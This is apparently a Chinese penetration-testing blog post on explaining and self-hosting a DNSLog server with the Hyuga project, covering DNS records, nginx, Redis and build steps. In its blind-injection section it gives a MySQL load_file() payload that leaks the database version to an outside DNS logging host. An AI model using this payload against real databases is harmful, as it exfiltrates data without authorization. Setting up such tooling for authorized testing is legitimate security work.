title:
  DNSLog搭建
date:
  '[object Object]': null
tags: [渗透]

---

## 一、前言：

DNSLog的出现为渗透测试中的回显提供了很大的方便，一些无回显的漏洞，也可以通过DNSLog进行信息回显。本文将对DNSLog的搭建进行介绍，让你快速搭建起属于自己的DNSLog

<!--more-->

## 二、DNSLog原理
### 基本

DNS解析时，我们可以设置自己的NS服务器进行解析，并获取到全部的解析历史记录的日志，从而从日志中获取信息
![e61f61521758300f72d28ce047c4468e.png](http://lovebear.top/img/DNSLog/1.png)

### DNSLog盲注

Mysql load_file()函数可以发起请求，LOAD_FILE()函数操作需要用户具有FILE权限。构造语句，利用load_file()函数发起请求，使用Dnslog接收请求
```
select load_file(concat('\\\\',(select version()),'.mysql.4ke30o.ceye.io\\abc'))
```
**P.S.** 
1. 只能在windows系统下使用load_file()发起请求，在Linux环境下不能使用load_file()发起请求
2. secure_file_priv为""

## 三、搭建DNSLog

### 配置域名解析

**P.S.** 这里不推荐腾讯云（DNSPod），不能改自定义DNS服务器，也不支持NS记录泛解析，推荐阿里云

1. 准备两个域名，一台服务器
```
aaa.ink:	做web服务访问
aaa.cloud:	做DNS服务器域名
<server_ip>:运行DNSLog
```
**P.S.** 域名随便找，我这里申请了ink，cloud（便宜qwq）

2. aaa.cloud解析设置
![3ab351de66776f066705b4b3b1cbcccd.png](http://lovebear.top/img/DNSLog/2.png)
记录值为 <server_ip>
3. aaa.ink解析设置
![213ac4c894045259be9b4bac28bb193b.png](http://lovebear.top/img/DNSLog/3.png)
- A记录值为<server_ip>
- NS记录值为`ns1.aaa.cloud`, `ns2.aaa.cloud`
4. aaa.ink 设置自定义的DNS服务器
![148bff018334ce7634f2c5166ba53d55.png](http://lovebear.top/img/DNSLog/4.png)
修改DNS服务器为刚刚设置的NS记录值
![ba0883c24db987ab6443f1c17a20bc0a.png](http://lovebear.top/img/DNSLog/5.png)

### DNSLog部署

本文使用 [**Hyuga**](https://github.com/cckuailong/Hyuga) 搭建

#### 环境准备
1. OS：Ubuntu，其他系统相似，只不过安装软件命令有区别
2. 安装Redis
```
apt install redis-server
service redis start
```
3. 安装nginx
```
apt install nginx
service nginx start
```
4. 安装 yarn
```
curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -
echo "deb https://dl.yarnpkg.com/debian/ stable main" | sudo tee /etc/apt/sources.list.d/yarn.list
apt update
apt install yarn
```
5. 安装 node
```
curl -sL https://deb.nodesource.com/setup_lts.x | bash -
apt install -y nodejs
```
6. 安装cnpm (国内npm慢)
```
npm install -g cnpm --registry=https://registry.npm.taobao.org
```
7. 安装vue
```
cnpm install -g @vue/cli
```
8. 安装vue-cli-service
```
cnpm install @vue/cli-service -g
```

#### 修改环境变量以及配置

1. 环境变量写入项目根目录下的 .env 文件：
```
APP_ENV=production

REDIS_SERVER=<redis_ip> # 本地就localhost
REDIS_PORT=6379
RECORDEXPIRATION=30

DOMAIN=<aaa.ink> # 记录域名
NS1_DOMAIN=ns1.<aaa.cloud> # NS域名
NS2_DOMAIN=ns2.<aaa.cloud> # NS域名
SERVER_IP=<server_ip> # 公网IP
```
2. 修改 deploy/nginx/nginx-hyuga.conf 中的 server_name, proxy_pass
```
server {
    listen 80;
    server_name <aaa.ink>;
...
}
...
server {
    listen 80;
    server_name *.<aaa.ink>;
....
	location / {
        proxy_set_header Host $http_host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_pass http://<aaa.ink>:5000;
    }
```

#### 前端
1. 修改 ui/src/utils/conf.js API 接口
修改 api.<aaa.ink>:5000 为记录域名
2. 构建前端文件
```
$ cd Hyuga/ui
$ yarn build
$ rm -r ../frontend
$ mv dist/ ../frontend
```

#### 部署
1. 前端
a. 配置Nginx
```
cp deploy/nginx/nginx-hyuga.conf  /etc/nginx/conf.d/
vim /etc/nginx/conf.d/nginx.conf
```
![3bb2139c759b6dd937ab17d90e60ab42.png](http://lovebear.top/img/DNSLog/6.png)
b. 配置前端项目
```
rm -r /var/www/*
cp /root/Hyuga/frontend/* /var/www/ -R
```
c. 重启nginx
```
service nginx restart
```
2. 后端
a. 编译go代码
```
go build hyuga.go
```
b. 运行
```
nohup ./hyuga &
```

P.S. 云服务器记得配置安全策略，打开80，53，5000端口

## 四、运行展示

![13c661dbadac5980d4cbc48423a817ad.png](http://lovebear.top/img/DNSLog/7.png)
已经收到访问记录
![4971b643d6f90d12e40ca5c890a70548.png](http://lovebear.top/img/DNSLog/8.png)